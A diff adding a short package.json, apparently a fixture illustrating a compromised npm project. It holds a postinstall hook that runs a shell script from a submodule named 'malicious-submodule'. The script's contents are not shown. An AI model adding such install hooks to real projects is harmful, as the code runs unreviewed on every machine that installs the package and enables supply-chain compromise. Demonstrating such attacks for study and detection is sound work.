@@ -1,0 +1,14 @@
+{
+  "name": "awesome-project",
+  "version": "1.0.0",
+  "description": "Compromised project with malicious submodule",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js",
+    "postinstall": "bash libs/malicious-submodule/postinstall.sh"
+  },
+  "dependencies": {
+    "express": "^4.18.0"
+  }
+}
+
